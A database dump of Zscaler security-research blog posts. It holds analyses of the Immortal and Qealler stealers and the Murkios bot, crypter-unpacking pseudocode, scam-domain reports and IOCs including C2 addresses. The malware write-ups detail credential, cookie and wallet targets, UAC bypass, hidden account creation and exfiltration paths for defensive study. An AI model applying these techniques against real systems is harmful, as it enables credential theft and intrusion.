INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (1, 'Immortal information stealer', 'Rajdeepsinh Dodia,', 'March 15, 2019', 'Recently, the Zscaler ThreatLabZ team came across new information-stealer malware called Immortal, which is written in .NET and designed to steal sensitive information from an infected machine. The Immortal stealer is sold on the dark web with different build-based subscriptions. This blog provides an analysis of the data Immortal steals from browsers, the files it steals (and the applications it steals from), and what it does with the stolen data.    Immortal starts its infection by creating a directory with a random name in a temp folder. Next, it creates a password.log file in \"\\%Temp%\\{Random_DirName}\\password.log”.        Immortal writes the malware name, author’s name, and telegram address of the author in a password.log file.      	Date: Current date and time  “MM/dd/yyyy HH:mm:ss”  	Windows Username: Username  	HWID: MachineGuid  	System: Operating system name      Browser info stealing    Immortal steals data from 24 browsers. It steals stored credentials, cookies, credit card data, and autofill data from the targeted browsers.    When the user saves a username and password in the targeted browser, it stores the data in a “Login Data” file in an SQLite database format, and the browser-stored cookie information in the “Cookies” file. It also stores autofill data, credit card data, and other web information in the “Web Data” file. Below are the file paths for those files:      	“\\%AppData%\\Local\\{Browser}\\User Data\\Default\\Login Data”  	“\\%AppData%\\Local\\{Browser}\\User Data\\Default\\Web Data”  	“\\%AppData%\\Local\\{Browser}\\User Data\\Default\\Cookies”      List of targeted browsers:      	Chrome  	Yandex  	Orbitum  	Opera  	Amigo  	CentBrowser  	Torch  	Comodo  	Go!  	ChromePlus  	Uran  	BlackHawk  	CoolNovo  	AcWebBrowser  	Epic Browser  	Baidu Spark  	Rockmelt  	Sleipnir  	SRWare Iron  	Titan Browser  	Flock  	Vivaldi  	Sputnik  	Maxthon      Credential stealing    The malware fetches credentials from the “Login Data” file and stores them in the password.log file as per the format below: Path: ” \\%Temp%\\{Random_DirName}\\password.log”.          	SiteUrl: Website URL  	Login: Username  	Password: Password  	Program: Targeted browser      Cookie stealing    Immortal fetches cookie data from the cookies file and stores it in {Browsername}_cookies.txt file.    Path: “\\%Temp%\\{Random_DirName}\\Cookies\\{Browsername_cookies.txt}\". The format is shown below.        Credit card data    Immortal fetches credit card data from the “Web Data” file and stores it in the {Browsername}_CC.txt file.    Path: “\\%AppData%\\{Random_DirName}\\CC\\{Browsername_CC.txt}”. The format is shown below.        Autofill data    The autofill feature of a browser allows the user to store commonly entered information in web forms. This information might include username, email, password, address, and credit card information. So, when the user opens a web page, it will automatically fill in the information already saved by the browser. The autofill information is stored in the “Web Data” file.    Immortal fetches autofill data from the “Web Data” file and stores it in the {Autofill}_CC.txt file.    Path: “\\%AppData%\\{Random_DirName}\\Autofill\\{Browsername_Autofill.txt}”. The format is shown below.             File stealing    Immortal steals files from many different applications. The details are below.    Minecraft launchers    The malware steals user data files and sessions from Minecraft launcher applications. The malware copies those applications\' files into “%Temp%\\{Random_DirName}\\Applications\\{AppName}\\”. The following is a list of the applications:      	MinecraftOnly  	McSkill  	LavaCraft  	MinecraftLauncher  	VimeWorld  	RedServer          Steam    The malware steals files for the Steam application. Steam is an application for playing, discussing, and creating games. The files stolen by Immortal are as follows:      	SSFN (2 files)  	VDF files from the config folder  	  		Config.vdf  		loginusers.vdf  	  	          Telegram and Discord    Immortal also steals session-related files from Telegram and Discord. Telegram is a cloud-based instant messaging and voice over IP service. Discord is the cross-platform voice and text chat application designed to help gamers talk to each other in real time. Immortal copies those files into “%Temp%\\{Random_Name}\\Applications\\{AppName}\\”.    File Path:      	%AppData%\\Telegram Desktop\\tdata\\D877F783D5D3EF8C1\\  	%AppData%\\Telegram Desktop\\tdata\\D877F783D5D3EF8C1\\map0  	%AppData%\\Telegram Desktop\\tdata\\D877F783D5D3EF8C1\\map1  	%AppData%\\discord\\\\Local Storage\\\\https_discordapp.com_0.localstorage      FileZilla    Immortal steals files that contain FileZilla credentials. FileZilla is a known FTP tool used for file transfer. The malware copies the below files into “\\%Temp%\\{Random_DirName}\\FileZilla\\”.      	\\%AppData%\\Filezilla\\recentservers.xml  	\\%AppData%\\Filezilla\\sitemanager.xml      Bitcoin-Qt wallet    Immortal steals wallet.dat files from Bitcoin-Qt, a free and open-source Bitcoin wallet software. Below is a screenshot of the code for fetching the wallet path from the registry. The malware copies the wallet.dat file in “%Temp%\\{Random_DirName}\\”.        Desktop files    Immortal also goes through every file in the desktop folder on the victim’s system. It steals extension files (listed below) and copies them into “%Temp%\\{Random_DirName}\\Files\\”.      	Txt  	Log  	Doc  	Docx  	sql      Screenshot & Webcam    Immortal takes a screenshot of the desktop of the infected system and saves it in “\\%AppData%\\{Random_DirName}\\desktop.jpg”. It also captures a webcam snapshot and saves in it “\\%AppData%\\{Random_DirName}\\CamPicture.jpg”.       Network communication    The malware stores all the stolen data in the directory “\\%Temp%\\{Random_DirName}\\”. After that, it compresses all the files in a ZIP archive and saves the compressed file in \\%Temp%\\{Random_filename}.zip. Further, it sends {Random_filename}.zip to its command-and-control server as shown below. It also deletes the “\\%Temp%\\{Random_DirName}\\” before sending the ZIP file.          	User = User name  	Hwid = MachineGuid      At the time of analysis, the command & control panel for this stealer was live.        We found the Immortal stealer being advertised and sold with different build-based subscriptions. The following is a screenshot of a page that describes all of Immortal\'s functionality and cost per build. A per-post price for one build is $30.        IOCs    Md5: 1719ff4ff267ef598a1dcee1d5b68667    Downloading URL : www.appleidservice[.]jp/stealer/files/svhost.exe    NetworkURL: www.appleidservice[.]jp/stealer/files/upload.php', '', 'https://www.zscaler.com/blogs/research/immortal-information-stealer');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (2, 'Scammers Use Cheap and Squatted Domains to Create Fake Sites', 'Rubin Azad', 'March 06, 2019', 'Last summer, a ThreatLabZ blog covered scam campaigns in which bad actors using .tk domains were showing warnings of a fake malware infection and trying to generate revenue by offering remediations. \r\n\r\nWe recently noticed the development of similar campaigns in which bad actors are making use of cheap domains, registering them in bulk, and scamming people in an attempt to generate revenue. In this blog, we will cover a few of such campaigns.\r\n\r\n \r\n\r\nInfrastructure Sharing\r\n\r\nIn our research last year, we noticed that domains with patterns such as some-domain[.]tk/index/?{random-long-int} were primarily showing support scams, such as alerting users that their systems had been infected with malware or claiming an infected site was from Microsoft and asking the user to use the hotline number provided. Once contacted, the scammer would take money from the end-user and perform random actions, show the filesystem tree, and claim the system was fixed.\r\n\r\nThis year, we are seeing slightly different behavior in which the same URI patterns are being leveraged for other scam redirections.\r\n\r\n\r\n\r\nFig. 1: Infection chain \r\n\r\nThe main site is injected with a malicious script responsible for malicious redirection chaining.\r\n\r\n\r\n\r\nFig. 2: Injected scripts\r\n\r\nThese injected scripts/URLs load different types of content in different iterations.\r\n\r\n\r\n\r\nFig. 3: Redirection chain\r\n\r\nAt the moment, these .tk domains are redirecting to various fake sites, including foreign exchange (forex), credit card, and healthcare, but the attacker can easily add more fake sites from other categories.\r\n\r\n\r\n\r\nFig. 4: Final .tk redirection to fake site\r\n\r\nThere are more than 700 .tk domains hosted on 185.251.39[.]220 and more than 80 .tk domains on 185.251.39[.]181, which are associated with this campaign. \r\n\r\n\r\n\r\n\r\n\r\nDomain squatting leads to tech support scam\r\n\r\nWe came across interesting instances in which a Google Mail squatted domain gmil[.]com was responsible for a Microsoft Tech Support scam redirection.\r\n\r\n\r\n\r\nFig. 5: Google Mail squatted domain leading to Microsoft Tech Support scam\r\n\r\nThe scam page that we received is similar to what we saw in our previous analysis, and there has been little to no development.\r\n\r\n\r\n\r\nFig. 6: Support scam page\r\n\r\nThe page microsft0x8024f0059rus[.]ml is hosted on 216.10.249[.]196, which is hosting over 400 .ga, .cf, .gq, .ml, and .tk domains; all are involved in Microsoft tech support scam activity.\r\n\r\n \r\n\r\nPopCash leading to fake sites, including medicine, tax debt relief, repair services, and adult sites \r\n\r\n\r\n\r\nFig. 7: PopCash redirecting to fake sites that use the same page template\r\n\r\nIn another redirection iteration, we saw adult-themed sites and a fake medicine site claiming to be CNN.\r\n\r\n\r\n\r\nFig. 8: Adult themed site and fake CNN page selling Viagra\r\n\r\n \r\n\r\nFake airlines\r\n\r\nWe also spotted fake airline sites using an identical template, contact number, and Google gtag.\r\n\r\n\r\n\r\nFig. 9: Similar fake airline sites\r\n\r\nThe use of the nearly identical template means there is a scam kit being used to automatically generate their page content.\r\n\r\n\r\n\r\nFig. 10: Template comparisons\r\n\r\nThe IP address 103.25.128[.]224 is hosting 70 or more of these fake airline sites.\r\n\r\nConclusion\r\n\r\nScam campaigns leveraging cheap domains such as .tk, .ga, .gq, .ml, .cf, and others have been on the rise for past few years now. Because registering such domains is very inexpensive, bad actors are doing bulk registrations for such domains and using them to generate revenue.\r\n\r\nWhile some of these sites are poorly designed and obvious scams, others are sophisticated and look very much like the real brand. Always look at a site’s URL to make sure the site is legitimate before initiating communications or making any kind of transaction.\r\n\r\nZscaler ThreatLabZ is actively monitoring scamming sites and other threats to ensure coverage and will continue to share information on these campaigns.\r\n\r\nIOCs\r\n\r\nAll scam domains involved in the above campaigns can be seen here.', '', 'http://www.zscaler.com/blogs/research/scammers-use-cheap-and-squatted-domains-create-fake-sites');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (3, 'What’s hiding in encrypted traffic? Millions of advanced threats.', 'Deepen Desai', 'February 27, 2019', 'Once seen as the ultimate protection for data being transmitted over the internet, encryption has become a vast playground for cybercriminals.    Zscaler ThreatLabZ, the research organization at Zscaler, analyzed the encrypted traffic traversing the Zscaler cloud in the second half of 2018 and prepared a report of our findings. The Zscaler cloud processes more than 60 billion transactions a day and, at that volume, it provides valuable insight into traffic patterns and the types of threats organizations are facing globally.    We already knew that the use of encryption had been rising each year and our research showed this trend continuing. By December 2018, the amount of encrypted traffic on the Zscaler cloud increased by 10 percent to nearly 80 percent of all traffic. This growth rate is consistent with that of the Google Transparency Report and Mozilla’s findings for the Firefox browser.    Zscaler has always made its cloud statistics available to anyone who wants to see them. We have recently created a dashboard that shows the volume of encrypted traffic crossing our cloud as a percentage of total traffic. You can view that interactive dashboard here.    Real-Time Zscaler Cloud Activity: Encrypted Traffic Dashboard    As the use of SSL* grows, cybercriminals are increasingly using encryption to conceal and launch attacks. In the second half of 2018, the Zscaler cloud blocked 1.7 billion threats hidden in SSL traffic, which translates to an average of 283 million advanced threats blocked per month. The top blocked threat categories in our study period included phishing attempts—which increased more than 400 percent over 2017—as well as malicious content, botnets, and browser exploits.    One of the reasons that SSL-based threats have increased so dramatically is because SSL/TLS certificates, which were once expensive and difficult to obtain, are now easy to get—at no charge. The vast majority of the certificates involved in security blocks in the Zscaler cloud were issued by Let’s Encrypt, a free service. Furthermore, nearly 32 percent of newly registered domains that were blocked by our cloud were using SSL encryption to deliver the content. We recommend inspecting and/or restricting access to newly registered domains, including those using SSL, to scan for malicious content being delivered from an otherwise unknown location with no history or reputation.    While the percentage of growth in SSL traffic is slowing as it reaches near totality, the threat trends are increasing in both frequency and sophistication. Cybercriminals know that most organizations are unable to inspect SSL traffic at scale. So, with malicious websites that can be set up in no time with free SSL certificates, they’re launching attacks that have a good chance of going undetected.    Organizations should be inspecting all encrypted traffic, even from CDNs and trusted sites, because many of the threats we continue to block are from legitimate sites that have been compromised. Organizations that don’t inspect all traffic are at risk of infiltration that can be difficult to remediate, lead to costly breaches, or damage their reputation.    Read the full ThreatLabZ analysis of SSL/TLS-based threats: SSL Report         *The encryption protocol is known by several terms—Secure Sockets Layer (SSL), Transport Layer Security (TLS), and HTTPS—and they are often used interchangeably. For the sake of simplicity, I am using “SSL” in this blog.     - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -    Deepen Desai is Zscaler VP of Security Research and Operations', '', 'https://www.zscaler.com/blogs/research/whats-hiding-encrypted-traffic-millions-advanced-threats');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (4, 'Murkios bot drops files and controls system remotely', 'Tarun Dewan,', 'February 21, 2019', 'The Zscaler ThreatLabZ team came across the Murkios bot, which silently installs itself onto a user’s system and connects to a command-and-control (C&C) server by opening Secure Shell (SSH) terminals from the compromised system. This bot also installs “Plink,” which is legitimate remote sharing software that runs via command prompt using different switches from the C&C server. The bot appeared to have been written by Russian malware authors, which we were able to confirm after seeing some snippets in the resource section.    The screenshot below shows the malware tests on different operating systems.        During our analysis, we saw the following files being dropped by Murkios:    Win XP:    %AppData%\\ssh\\start.exe  %AppData%\\ssh\\systems.exe  %AppData%\\ssh\\winsys.exe  %AppData%\\ssh\\winsystem.exe  %AppData%\\ssh\\uid.txt  %AppData%\\ssh\\sel.txt    Win 7/Win 10:    %AppData%\\Roaming\\ssh\\start.exe  %AppData%\\Roaming\\ssh\\systems.exe  %AppData%\\Roaming\\ssh\\winsys.exe  %AppData%\\Roaming\\ssh\\winsystem.exe  %AppData%\\Roaming\\ssh\\uid.txt  %AppData%\\Roaming\\ssh\\sel.txt    Below is a summary of activities performed by dropped files:      	systems.exe – Installs RDP wrapper library  	winsystem.exe – Legitimate Plink PuTTY command line tool  	winsys.exe – Module acts as a mule sending all the harvested information to the attacker and has screen capture functionality  	start.exe – Has functionality to bypass UAC, checks OS version installed, executes other modules such as winsys.exe, adds net user accounts  	uid.txt – Stores unique identification (UID) of the victim\'s system      All the dropped files are present in the resource section of the parent file.        The malware tries to bypass the User Account Control (UAC) to execute <start.exe> which, in turn, establishes a connection with the C&C server and steals system information from the victim’s system.        The malware checks to see if the UAC value is enabled in the registry; if it is already set to “1” (which means UAC access control is enabled in the system), it will delete the mscfile and create a new mscfile and put the start.exe file path in it, which is placed in the application directory.    Next, it checks whether the system is 32 bit or 64 bit:        The start.exe further creates schtask.exe to execute winsys.exe, which installs the legitimate remote sharing tool onto the victim’s system.        Parameters:    /sc: Specifies Schedule Type    ONLOGON: The task runs whenever a user (any user) logs on    /tn:         Specifying the name of the task    /tr:         Specifies the program or command that the task runs ’winsys.exe’ in our case    The malware uses the net user command to add a user account and sets a password from the command prompt in hidden mode.             Enabling remote desktop from the command prompt:        Parameters:    /MAXPWAGE: UNLIMITED: Never expire the password.    localport=3389: The server listens on TCP port 3389, which is the port Microsoft uses for Windows Remote Desktop, and makes remote assistance connections which are also used by Windows terminal users. It tries to change the Remote Desktop Protocol-Transmission Control Protocol (RDP-TCP) connections permissions in the Windows registry through the Microsoft Windows terminal service.          The malware can take control of a remote computer or virtual machine over a network. This malware is using the following commands while in RDP.         	  		  			Functions  			Description  		  		  			AllowTSConnections  			   			  			  				  					  						  						Ready to make the connection for remote desktop from terminal service  						  					  				  			  			  			  		  		  			fDenyTSConnections  			Allows or denies connection to Terminal Services; possible values are 0 or 1. 0  		  		  			MaxConnectionTime  			Maximum session time in seconds  		  		  			MaxDisconnectionTime  			   			  			  				  					  						  						Maximum time in seconds after which disconnected sessions are ended  						  					  				  			  			  			  		  		  			MaxIdleTime  			   			  			  				  					  						  						Maximum idle time in seconds for user sessions  						  					  				  			  			  			  		  	           Further, the system.exe process is hidden using the switch mode through cmd.exe and installs RDP Wrapper files into the C:\\Program Files\\RDP Wrapper directory, which enables Remote Desktop Host support and concurrent RDP sessions on home systems with reduced functionality. The RDP Wrapper works as a layer between the Service Control Manager and Terminal Services, so the original termsrv.dll file remains untouched.            Sends data to C&C:        After sending data to the server, the malware executes winsys.exe, which then executes winsystem.exe to download Plink PuTTY software. The winsys.exe executable also runs in hidden mode through the command prompt.    Winsys.exe    This module acts as a mule and sends all the information to the attacker. This module has three functions. The first function captures the screen from the compromised system and sends it to the attacker.        After receiving the screen capture from the compromised system, the attacker gives the acknowledgment “online=ok” and sends the UID and screen capture from the compromised system back to the attacker.        Finally, the malware tries to make an SSH tunnel to 193.238.46.117 in hidden mode with multiple arguments, as shown below.        -P :         connect to the specified port    -hostkey:     manually specify a host key    -batch:        disable all interactive prompts    -pw:          login with specified password    IOC:    Md5:    soft.exe    32dd601839d62e939880d03a81fde5e8    Dropped files:      	  		  			Filename  			Md5  		  		  			system.exe  			6E83A0F762F014924E24D81C07021690  		  		  			winsys.exe  			473ED02A55DC91A6E719F270DF16AE35  		  		  			winsystem.exe  			528248AE133191C591EC6D12732F2CFD  		  		  			start.exe  			2A07FE3AEBD009D7308FD25E0C872CF9s  		  		  			uid.txt  			E46B1D5A895E0E15C3CF0F2BA05DAB45  		  	           Download URL:    murikos[.]in/soft.exe', 'Malware', 'https://www.zscaler.com/blogs/research/murkios-bot-drops-files-and-controls-system-remotely');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (5, 'Demystifying the Crypter Used in Emotet, Qbot, and Dridex', 'Manohar Ghule', 'February 14, 2019', 'A crypter is software that can encrypt, obfuscate, and manipulate malware to make it harder to detect by security programs. The Zscaler ThreatLabZ research team recently spotted a common crypter being used in the recent Emotet, Qbot, and Dridex campaigns. This same crypter was observed in some of the Ursnif and BitPaymer campaigns as well. One of the reasons that Emotet and Dridex were able to survive for so long can be attributed to their ability to evade detection through the use of a volatile and polymorphic crypter, which wraps its original binary inside to complicate its detection and analysis.    Emotet is modular malware that primarily functions as a downloader or dropper for other banking Trojans. Emotet has been active for the past four years and it was one of the most prevalent malware families of 2018. In previous blogs, we analyzed Emotet and one of its delivery campaigns. Dridex is a banking Trojan that evolved from the Zeus Trojan family. Dridex remains active in the wild even after the FBI’s takedown attempt in 2015. Qbot can allow remote access to a victim’s system, steal information, and upload this stolen information to the attacker’s remote server. Recently, Emotet’s payload URLs were found to be serving Qbot and were using the same crypter we’re examining in this report.    This crypter provides multiple layers of protection on its core malware binary. In this research, we will describe the properties of crypted binaries that hold true across various mutations. These properties can be validated statically (without executing the binary) and used to write a decrypter. Below is a pictorial view of how Emotet’s core binary is digested inside the crypter’s layers of obfuscation and encryption wrappers.    0. Core binary    1. Code is obfuscated by shuffling instructions and substituting jump instruction    2. Obfuscated binary is encrypted and appended at the end of the custom loader binary    3. File alignment of custom loader binary is jumbled    4. Custom loader binary is encrypted    5. Final binary encapsulating scattered chunks of encrypted custom loader binary             Image 1: Stages occur in crypter    Our goal is to reverse each of above stages to get the core malware binary. Furthermore, the core binary is supposed to be independently loadable/executable, and IOCs should be easily extractable. So, starting with stage 5, we will describe certain heuristics properties of the binary and using these properties we will decrypt the stage and continue to track down till stage 0. In our analysis, we found that these heuristics properties hold true across all mutations of the binaries.         Stage 5:    The 5th stage binary is the Emotet executable file that is downloaded via malicious links in MalSpams or malicious macros in MS Office documents. Our goal in stage 5 is to reach stage 4 to obtain the encrypted custom loader binary. As we can see in image 1, the binary at this stage contains scattered chunks of encrypted custom loader binary. We need to spot these chunks and assemble them in the proper order. Before discussing how we are going to do this, what follows are few examples of how these chunks can be spread across the binary. The chunks are outlined in red.            Image 2. Examples of chunk patterns    From the above examples, we can see that these chunks are not found in fixed locations, as their sizes are inconsistent, and the order of chunks varies, too. Therefore, our first challenge is to locate these chunks and arrange them in the proper order. The good news is that we know the crypter will also need to arrange the chunks and will do so by storing the chunk addresses and sizes in a table. Let’s call this table “Chunk Descriptor Table.” The bad news is that this table cannot be found in a predictable location in the binary nor is the structure of the table is constant across mutations of the binary. Below are some of the variants of this table structure. Chunk Descriptor Table is basically an array of the Chunk Descriptor Entry.    struct ChunkDescriptorEntry[n] ChunkDescriptorTable; // n == number of chunks        Image 3: Examples of Chunk Descriptor Table structures         In above structure, “chunkAddressDword” contains the virtual address of chunk. The size of chunk can be obtained by one of following operations on “firstDword” and “secondDword”. This operation is constant across all chunk descriptor entries.      	unsigned int chunkSize = firstDword + secondDword  	unsigned int chunkSize = firstDword ^ secondDword  	unsigned int chunkSize = secondDword - firstDword      Heuristics properties of Chunk Descriptor Table:      	0 <= x <= ?,      0 <= y <= ?,      0 <= z <= ?  	offset(firstDword) < offset(secondDword) < offset(chunkAddressDword)  	offset(firstDword) < offset(chunkAddressDword) < offset(secondDword)  	offset(chunkAddressDword) < offset(firstDword) < offset(secondDword)  	entropy(chunk) > 5 out of 8.  	Chunks do not contain consecutive 4 zeros.      The following is the pseudo code for finding the chunk pattern. The function “FindChunkEntry” return offset of chunk and the distance of firstDword, chunkAddressDword from the beginning of the chunk offset. If the return value of three consecutive calls to function and length between three returned offsets are equal, then the whole array can be parsed to generate an associative array of chunk addresses and chunk sizes.    (offset1, m1, n1) = FindChunkEntry(filedata, fileSize)  (offset2, m2, n2) = FindChunkEntry(filedata + offset1, fileSize)  (offset3, m3, n3) = FindChunkEntry(filedata + offset2, fileSize)  If (offset2 - offset1) == (offset3 – offset2)      // found the FindChunkEntry array    FindChunkEntry(filedata, fileSize)          p = 0          while p > fileSize                  firstDword = filedata[p]                  q = p                  while q < p + T                  secondDword = filedata[p]                          chunkSize = firstDword (+) secondDword                          r = p - T                          while r < q + T                                  chunkAddress = filedata[r]                                  if ValidateChunk(chunkAddress, chunkSize) == TRUE // Heuristics 5, 6                                          if p < q < r                                                  x = q - p                                                  y = r - q                                                  z = ?                                                  return (p, x, y)                                          elif p < r < q                                                  x = r - p                                                  y = q - r                                                  z = ?                                                  return (p, x, y)                                          elif r < p < q                                                  x = p - r                                                  y = q - p                                                  z = ?                                                  return (r, x, y)                                  r += 4                          q += 4                  p += 4    Now that we have an associative array of chunk address and chunk sizes, we can combine these chunks to get the encrypted custom loader binary. Here we are at stage 4.         Stage 4: ​    In our analysis, we observed that the custom loader binary (PE exe) is encrypted with a simple byte-to-byte addition in the loop with a key array. It is not necessary for the binary to be present at zero offset in this encrypted data. In stage four, our objective is to find the offset of the PE file in the encrypted data and the decryption key. First, we will find the decryption key, which can be brute forced over encrypted data to find the starting offset of the PE file. Decryption is present in the 5th stage binary but not at a predictable location. We will derive the decryption key from the encrypted data itself.    The heuristics property to be noted about the encrypted data is a pattern of a repeating consecutive sequence of bytes. This pattern of the repeating sequence is induced by nature of the encryption and the properties of the PE file. In the encrypted data, this pattern will appear at locations that should have filled with zeros when non-encrypted. The following are possible locations.      	At beginning of the encrypted data because the PE file will not necessarily begin at zero offset.  	Caves between two sections and between the PE header and the first section.          Image 4: Encrypted data showing an example of the repeating sequence of bytes             Image 5: Decrypted data showing the appearance of the corresponding PE file         The repeating sequence is our key and the length of the sequence is the key length. The next thing we need to do is to find the beginning of the key in this consecutively repeating sequence and offset of the PE file. This can be done by simply applying the inverse of the encryption on this sequence and the encrypted data from its starting point while checking against the MZ header.    Here is the pseudo code:    FindPeFileAndKeyStart (keySequence, keySequenceLen, encryptedData, encryptedDataLen)          k = 0          while (k < keySequenceLen)                  i = 0                  while (i < encryptedDataLen)                          if (    // inverse encryption                              encryptedData[i + 0] - keySequence[k + 0] == 0x4D &&                              encryptedData[i + 1] - keySequence[k + 2] == 0x5A &&                              encryptedData[i + 3] = keySequence[k + 3]                              )                                  peFileOffset = i                                  keyStart = k                                  return (peFileOffset, keyStart)       Now that we have the PE file offset and key, we can decrypt the data with byte-to-byte subtraction with the key in the loop. At this point, we have the custom loader binary, but this custom loader binary has a strange file alignment that we need to normalize. Thus, we are at stage 3.    But before proceeding with stage 3, here are few more methods that could also have given us the key in this stage.      	Search for instruction in the binary of the 5th stage, which accesses the key. Here are the examples that we found in our analysis.    	  		8A 0C 1D FF 31 40 00                          MOV CL, BYTE PTR DS : [EBX + 4031FF]  		2A 0C 1D 30 42 40 00                         SUB CL, BYTE PTR DS:[EBX+404230]  		8D 84 01 0B 32 36 01                          LEA EAX,DWORD PTR DS:[ECX+EAX+136320B]  		8B 1D E4 DD 46 00                              MOV EBX,DWORD PTR DS : [46DDE4]  		8D 0D 81 A1 3D 01                              LEA ECX,DWORD PTR DS:[13DA181]  		8A 86 77 41 E8 00                                MOV AL, BYTE PTR DS : [ESI + E84177]  		8A 98 77 51 C0 00                               MOV BL, BYTE PTR DS : [EAX + C05177]  		A1 3C FB 46 00                                     MOV EAX,DWORD PTR DS : [46FB3C]  	  	      DWORD points to a key array; of course it will give a false address. So, we need to validate the key by applying it on encrypted data for each such instruction.    2. In most cases, the key is found just above the pdb path.         Stage 3:    At this stage, we have a custom loader binary whose file alignment is messed up. We are going to assign a new file alignment to this PE image which is 0x200. Changing the file alignment is trivial, only requiring us to carefully shift sections of the new file alignment based calculated addresses and updating section addresses and sizes in the Section Header table.    Here is the pseudo code.    dwNewFileAllignment = 0x200  dwCurrentRawAddress = GetAllignedDwrod(PEHeader.OptionalHeader.SizeOfHeaders, dwNewFileAllignment);          while (i < NumberOfSections)                  NewSecionHeaders[i].PointerToRawData = dwCurrentRawAddress;                  NewSecionHeaders[i].SizeOfRawData = GetAllignedDwrod(OldSecionHeaders[i].SizeOfRawData, dwNewFileAllignment);                  Memcpy(pbyNewFileBuffer + dwCurrentRawAddress,                                  pbyOldFileData + OldSecionHeaders[i].PointerToRawData,                                  OldSecionHeaders[i].SizeOfRawData);                  dwCurrentRawAddress += GetAllignedDwrod(OldSecionHeaders[i].SizeOfRawData, dwNewFileAllignment);                  dwCurrentRawAddress = GetAllignedDwrod(dwCurrentRawAddress, dwNewFileAllignment);                  i = i + 1    This is it, we have plain and loadable binary of custom loader. That moved us to stage 2.       Stage 2:     In the appended data of the custom loader, there is encrypted data which is nothing but an obfuscated version of the core malware binary. The encryption method is the same as that of stage 4. All we need to do here is calculate the offset of the appended data and apply the decryption technique mentioned in the 4th stage. As a result, we got the core PE file, but it needed some fixes in the code as some instructions were missing in the binary.         Stage 1:    At this stage, we have a PE file which is somewhat incomplete because the loader binary had already eaten up some instructions from the code section. These eaten instructions will be put in memory and a JUMP instruction will be inserted in the code of the core binary, which points to the corresponding eaten instructions. Then the control is passed over to the core binary.    The below image is an example of how this obfuscation appears.             Image 6: Obfuscated code with JUMP instruction         The final objective is to de-obfuscate the code of the core binary. That means we need to return the eaten instructions back to their actual location and remove the JUMPs. At this point, the above code will appear as follows.             Image 7: De-obfuscated code    It is the loader’s responsibility to smoothly execute the core malware even after instructions are placed in different locations. The loader needs to calculate the JUMP address of the moved instructions and put the JUMP instructions in place of those instructions. For this, the moved instructions and their meta information are stored in the loader’s binary itself. In our analysis, we found that the table containing this information was present in the “.rdata” section.    struct DeobfuscationTable  {          unsigned int dwOrgInstrVAdddress; // Address of eaten instruction in loader’s binary          unsigned int dwPatchRVAddress;    // Offset where Jump need to insert          unsigned int dwOrgInstrLength;    // length of moved instructions in bytes  };         Once we get the de-obfuscation table, we just need to read “dwOrgInstrLength” bytes from the virtual address “dwOrgInstrVAdddress” loader’s binary and write them to a relative virtual address “dwPatchRVAddress” in the core malware binary.    Here is the pseudo code for this.    while (pDeObfuscationTable-> dwOrgInstrVAdddress !=  0x00)  {          patchOffset = GetFileOffsetFromRVA(          pCorePEHeader,          pCoreSectionHeaders,          pDeObfuscationTable-> dwPatchRVAddress);          orgInsOffset = GetFileOffsetFromRVA(          pLoaderPEHeader,          pLoaderSectionHeaders,          pDeObfuscationTable-> dwOrgInstrVAdddress - pLoaderPEHeader-OptionalHeader.ImageBase);          memcpy (                  pbyCoreFileData + dwPatchOffset,                  pbyLoaderFileData + orgInstrOffset,                  pDeObfuscationTable->dwOrgInstrLength);          pDeObfuscationTable += 1;  }       At this stage, we would have obtained the plain, independently executable core Emotet binary, which can be decompiled by IDA or can be bin-diffed with other binaries extracted by this decoder.', 'Malware', 'https://www.zscaler.com/blogs/research/demystifying-crypter-used-emotet-qbot-and-dridex');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (6, 'Qealler – a new JAR-based information stealer', 'Mohd Sadique', 'February 06, 2019', 'Recently, the Zscaler ThreatLabZ team came across a new type of malware called Qealler, which is written in Java and designed to silently steal sensitive information from an infected machine.    Qealler is a highly obfuscated Java loader that deploys a Python credential harvester.    We first saw this payload hit Zscaler Cloud Sandbox on Jan 21, 2019, and below is a screenshot of the detonation report.        Fig. 1: Zscaler Cloud Sandbox report    This threat makes use of social engineering techniques to initiate the infection, as the malicious JAR file has to be executed by the user. These malicious JAR files are portrayed as invoice-related files, requiring the user to double-click on the file to open it.    We have been monitoring this campaign for the past two weeks, and the malware has been quite active, spiking this week.        Fig. 2: Hits of Qealler in a week    The malicious JAR file (named Remittance.jar), which we analyzed, was getting downloaded from a compromised site (hiexsgroup.co[.]uk). It is heavily obfuscated with Proguard Java obfuscator. After deobfuscation and decompilation, we saw encrypted URLs that are accessible by a key, as shown in the figure below.        Fig. 3: Accessing encrypted URLs    The sample has a “synchronized” file that contains key-value pairs.        Fig. 4: Key-Value pair of encrypted URLs    On execution, this sample first creates two file paths in %USERPROFILE% by checksum of hardcoded strings.        Fig. 5: File Path creation    File path 1:     %USERPROFILE%\\\\CRC32(“2a890bc98aaf6c96f2054bb1eadc9848eb17633039e9e9ffd833104ce553fe9b”)\\\\CRC32(“qealler”)\\\\CRC32(“lib”)\\\\CRC32(“8e65457409fea4b2a183125f1c0f552080edb4cefa516b14698cb8d0abf5bb6dFILE”)    Equivalent to:    %USERPROFILE%\\\\a60fcc00\\\\bda431f8\\\\a90f3bcc\\\\83e7cdf9    File Path 2:    %USERPROFILE%\\\\CRC32(“2a890bc98aaf6c96f2054bb1eadc9848eb17633039e9e9ffd833104ce553fe9b”)\\\\CRC32(“qealler”)\\\\CRC32(“lib”)\\\\CRC32(“0e10ad6938994f2466b192d8f29217ad39155b8a3a082b6412048f4a12126b3bFILE”)    Equivalent to:    %USERPROFILE%\\\\a60fcc00\\\\bda431f8\\\\a90f3bcc\\\\db2bf213    If the above two files don’t exist, the malicious file decrypts the URL, downloads these two files, and stores them in the same place.        Fig. 6: Encrypts and drops downloaded module    The value of LIB_7Z_URL in the synchronized file is “xVQR4PWAw91AhkgaMsQVAVV1igV7HSOV1dqWgFN23eQtkNRd23RzTnPVGB9/iVYA” which is decoded by BASE64 and decrypted by AES-EBC with the hardcoded key 